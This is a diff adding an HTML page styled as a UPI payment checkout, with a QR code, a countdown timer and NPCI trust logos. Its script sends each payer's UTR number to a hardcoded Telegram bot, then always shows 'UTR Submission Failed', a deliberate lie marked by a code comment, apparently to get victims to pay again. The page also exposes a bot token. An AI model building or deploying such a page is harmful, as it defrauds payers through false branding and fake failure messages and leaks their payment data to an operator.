@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Payment Checkout</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f4f6f9;
+      color: #1f2937;
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 440px;
+      background: #ffffff;
+      min-height: 100vh;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.06);
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+    }
+
+    /* Top Blue Header */
+    .header {
+      background-color: #2952ff;
+      color: #ffffff;
+      padding: 15px 18px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-weight: 600;
+      font-size: 17px;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .header-title {
+      flex: 1;
+      text-align: center;
+      padding-left: 44px;
+    }
+
+    .timer {
+      font-size: 16px;
+      font-variant-numeric: tabular-nums;
+      font-weight: 600;
+    }
+
+    /* Main Content */
+    .content {
+      padding: 22px 18px 24px;
+      text-align: center;
+    }
+
+    .amount-label {
+      font-size: 14px;
+      color: #4b5563;
+      margin-bottom: 6px;
+    }
+
+    .amount-value {
+      font-size: 32px;
+      font-weight: 700;
+      color: #0d2b88;
+      margin-bottom: 14px;
+    }
+
+    .instruction {
+      font-size: 14px;
+      color: #374151;
+      line-height: 1.5;
+      margin-bottom: 18px;
+    }
+
+    /* QR Code Section */
+    .qr-wrapper {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 16px;
+    }
+
+    .qr-wrapper img {
+      width: 210px;
+      height: 210px;
+      object-fit: contain;
+      border: 1px solid #e5e7eb;
+      padding: 8px;
+      border-radius: 8px;
+      background: #fff;
+    }
+
+    /* Red Warning Text */
+    .warning-text {
+      color: #d93025;
+      font-size: 13px;
+      font-weight: 600;
+      line-height: 1.4;
+      margin-bottom: 16px;
+      padding: 0 10px;
+    }
+
+    .save-btn {
+      background-color: #3366ff;
+      color: #fff;
+      border: none;
+      padding: 9px 28px;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-bottom: 22px;
+    }
+
+    .save-btn:active {
+      opacity: 0.9;
+    }
+
+    /* Card Section */
+    .card {
+      background: #ffffff;
+      border: 1px solid #eef0f4;
+      border-radius: 12px;
+      padding: 16px;
+      text-align: left;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.04);
+    }
+
+    /* UPI Apps Banner Adjusted for Wide Aspect Ratio */
+    .apps-banner {
+      width: 100%;
+      margin-bottom: 18px;
+      text-align: center;
+    }
+
+    .apps-banner img {
+      width: 100%;
+      height: auto;
+      max-height: 78px;
+      object-fit: contain;
+      border-radius: 10px;
+      display: block;
+      margin: 0 auto;
+    }
+
+    /* UTR Input Section */
+    .utr-label {
+      font-size: 14px;
+      font-weight: 700;
+      color: #111827;
+      margin-bottom: 10px;
+      display: block;
+    }
+
+    .utr-input-box {
+      display: flex;
+      align-items: center;
+      border: 1.5px solid #d1d5db;
+      border-radius: 8px;
+      padding: 11px 12px;
+      margin-bottom: 14px;
+      background: #fff;
+    }
+
+    .utr-input-box:focus-within {
+      border-color: #2952ff;
+    }
+
+    .utr-prefix {
+      font-size: 14px;
+      font-weight: 700;
+      color: #111827;
+      margin-right: 10px;
+      white-space: nowrap;
+    }
+
+    .utr-prefix span {
+      color: #ef4444;
+    }
+
+    .utr-input-box input {
+      border: none;
+      outline: none;
+      width: 100%;
+      font-size: 15px;
+      color: #111827;
+      letter-spacing: 0.5px;
+    }
+
+    .submit-btn {
+      width: 100%;
+      background-color: #3366ff;
+      color: #ffffff;
+      border: none;
+      padding: 13px;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .submit-btn:disabled {
+      background-color: #93c5fd;
+      cursor: not-allowed;
+    }
+
+    /* Status Message Box */
+    .status-msg {
+      display: none;
+      margin-top: 12px;
+      padding: 10px 12px;
+      border-radius: 6px;
+      font-size: 13px;
+      font-weight: 600;
+      text-align: center;
+      background-color: #fef2f2;
+      color: #dc2626;
+      border: 1px solid #fecaca;
+    }
+
+    /* Bottom Footer: Adjusted for Wide NPCI + UPI Logo */
+    .footer {
+      background-color: #ffffff;
+      border-top: 1px solid #e5e7eb;
+      padding: 12px 16px 16px;
+      text-align: center;
+    }
+
+    .footer-logo-wrap {
+      margin-bottom: 6px;
+      transform: translateY(-2px);
+    }
+
+    .footer-logo-wrap img {
+      height: 36px;
+      width: auto;
+      max-width: 260px;
+      object-fit: contain;
+      display: inline-block;
+      vertical-align: middle;
+    }
+
+    .footer-sub {
+      font-size: 11px;
+      color: #64748b;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div>
+      <!-- Top Blue Header -->
+      <div class="header">
+        <div class="header-title">Payment</div>
+        <div class="timer" id="timer">05:00</div>
+      </div>
+
+      <!-- Main Body -->
+      <div class="content">
+        <div class="amount-label">Amount Payable</div>
+        <div class="amount-value" id="amountDisplay">₹300.00</div>
+
+        <div class="instruction">
+          Please fill in UTR after successful payment<br />
+          Use Mobile Scan QR To Pay
+        </div>
+
+        <!-- Main QR Image -->
+        <div class="qr-wrapper">
+          <img id="qrImage" src="qr.png" alt="Scan QR Code to Pay" />
+        </div>
+
+        <!-- Red Warning -->
+        <div class="warning-text">
+          Do not save QR codes for repeated payments, or the funds may not be credited.
+        </div>
+
+        <button class="save-btn" onclick="downloadQR()">Save</button>
+
+        <!-- UTR Card -->
+        <div class="card">
+          <!-- Banner Image -->
+          <div class="apps-banner">
+            <img src="banner.png" alt="" />
+          </div>
+
+          <label class="utr-label" for="utrInput">Paid? Submit UTR/Ref No</label>
+          <div class="utr-input-box">
+            <div class="utr-prefix"><span>*</span> UTR</div>
+            <input
+              type="text"
+              id="utrInput"
+              maxlength="12"
+              inputmode="numeric"
+              placeholder="Enter 12-digit UTR number"
+            />
+          </div>
+
+          <button class="submit-btn" id="submitBtn" onclick="submitUTR()">
+            Submit UTR / Ref No
+          </button>
+
+          <!-- Error Message -->
+          <div class="status-msg" id="statusBox"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Bottom Footer -->
+    <div class="footer">
+      <div class="footer-logo-wrap">
+        <img src="trust.png" alt="NPCI UPI" />
+      </div>
+      <div class="footer-sub">
+        Protected &amp; Verified UPI &amp; NPCI Standard Checkout
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "9147454427:AAE5sHAuwF7sZel5p_PegsVpLLZVv2UgPD8";
+    const CHAT_ID = "8794060112";
+    const AMOUNT = "₹300.00";
+
+    // 1. 5 Minute Countdown Timer (300 seconds)
+    let timeLeft = 300;
+    const timerEl = document.getElementById("timer");
+    const submitBtn = document.getElementById("submitBtn");
+
+    const countdown = setInterval(() => {
+      const minutes = String(Math.floor(timeLeft / 60)).padStart(2, "0");
+      const seconds = String(timeLeft % 60).padStart(2, "0");
+      timerEl.textContent = `${minutes}:${seconds}`;
+
+      if (timeLeft <= 0) {
+        clearInterval(countdown);
+        timerEl.textContent = "00:00";
+        submitBtn.disabled = true;
+        submitBtn.textContent = "Session Expired";
+      }
+      timeLeft--;
+    }, 1000);
+
+    // 2. Save QR Button Function
+    function downloadQR() {
+      const qrSrc = document.getElementById("qrImage").src;
+      const link = document.createElement("a");
+      link.href = qrSrc;
+      link.download = "qr.png";
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+
+    // 3. UTR Submit Handler -> Send to Telegram & Show Failure Message
+    async function submitUTR() {
+      const utrInput = document.getElementById("utrInput");
+      const utr = utrInput.value.trim();
+      const statusBox = document.getElementById("statusBox");
+
+      if (!/^\d{12}$/.test(utr)) {
+        statusBox.style.display = "block";
+        statusBox.textContent = "Please enter a valid 12-digit UTR number.";
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Checking...";
+
+      const msgText =
+        `🔔 *New UTR Submission*\n` +
+        `💰 *Amount:* ${AMOUNT}\n` +
+        `🔢 *UTR:* \`${utr}\`\n` +
+        `🕒 *Time:* ${new Date().toLocaleString("en-IN")}`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: msgText,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch (err) {
+        // Network error ke bawajood bhi user ko wahi message dikhega
+      }
+
+      statusBox.style.display = "block";
+      statusBox.textContent = "UTR Submission Failed, Please Recheck.";
+      submitBtn.disabled = false;
+      submitBtn.textContent = "Submit UTR / Ref No";
+    }
+  </script>
+
+</body>
+</html>
